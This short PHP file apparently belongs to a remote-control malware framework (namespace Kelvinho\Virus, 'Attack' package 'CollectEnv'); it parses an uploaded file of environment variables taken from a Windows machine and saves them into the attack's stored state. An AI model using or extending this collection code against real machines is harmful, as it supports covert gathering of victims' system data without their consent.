<?php

use function Kelvinho\Virus\filter;

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\CollectEnv\CollectEnv $this */

$lines = filter(explode("\n", $this->requestData->fileCheck("envFile")), fn($line) => !empty(trim($line)));
$data = [];
foreach ($lines as $line) {
    $contents = explode("=", $line);
    $data[$contents[0]] = explode(";", $contents[1]);
}

$this->setEnv($data)->saveState();
$this->usage()->setDisk(filesize($this->getStatePath()))->saveState();
$this->setExecuted();
